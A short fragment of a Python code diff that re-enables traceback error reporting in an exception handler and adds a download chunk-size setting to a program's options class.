+						fds.remove(readable)
+						del tasks[readable]
 	except:
-		#_, e, t = sys.exc_info()
-		#import traceback
-		#traceback.print_exc()
-		#traceback.print_stack()
-		#respond(Messenger.RESPONSE, str(t).encode())
+		_, e, t = sys.exc_info()
+		import traceback
+		traceback.print_exc()
+		traceback.print_stack()
+		respond(Messenger.RESPONSE, str(t).encode())
 		pass
 
 	os.close(master_fd)
@@ -2912,6 +3068,7 @@ class Options:
 		self.maintain = 1
 		self.max_open_files = 5
 		self.upload_chunk_size = 51200
+		self.download_chunk_size = 1048576
 		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
 		self.basedir = Path.home() / f'.{__program__}'
 		self.logfile = f"{__program__}.log"
